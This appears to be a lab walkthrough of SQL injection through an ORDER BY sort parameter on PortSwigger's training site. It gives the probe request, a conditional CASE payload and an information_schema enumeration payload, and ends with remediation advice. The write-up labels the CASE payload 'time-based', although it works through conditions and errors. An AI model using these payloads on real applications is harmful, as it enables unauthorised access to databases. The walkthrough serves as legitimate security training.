---
title: "SQL Injection via ORDER BY Clause — PortSwigger Lab Walkthrough"
date: "2025-11-20T10:00:00Z"
tags: ["sqli", "portswigger", "websec", "burpsuite"]
description: "A detailed walkthrough of exploiting an SQL injection vulnerability in the ORDER BY clause, bypassing application logic and extracting database contents."
platform: "PortSwigger"
---

## Overview

PortSwigger Web Security Academy labs are among the best hands-on resources for practising web application attack techniques in an isolated, legal environment. This walkthrough covers an SQL injection vulnerability found in a product sorting parameter that passes user input directly into an `ORDER BY` clause.

## Lab Setup

The target application is a shopping site that allows users to sort products by different columns. The `sort` parameter is appended to the SQL query without sanitisation:

```sql
SELECT * FROM products WHERE category = 'Gifts' ORDER BY {sort} ASC
```

## Discovery

Injecting a single quote into the `sort` parameter caused a visible database error, confirming the parameter was unsanitised:

```
GET /filter?category=Gifts&sort=1'
```

**Response:** `500 Internal Server Error` — confirming the injection point.

## Exploitation

Since `ORDER BY` clauses don't support `UNION`-based injection directly, I used a time-based blind approach to fingerprint the database:

```
GET /filter?category=Gifts&sort=(SELECT+CASE+WHEN+(1=1)+THEN+1+ELSE+(SELECT+1+UNION+SELECT+2)+END)
```

Confirmed as PostgreSQL via error messages. Then enumerated the schema:

```sql
sort=(SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0)
```

## Key Takeaway

`ORDER BY` injection is often overlooked because it doesn't support `UNION` syntax. Time-based and error-based techniques are the primary vectors. Always test sorting and pagination parameters — developers rarely sanitise them.

## Tools Used

- Burp Suite Professional
- sqlmap (for verification)

## Remediation

Use a server-side allowlist for sort column names. Never pass user input directly into SQL `ORDER BY` clauses, even after type-casting.
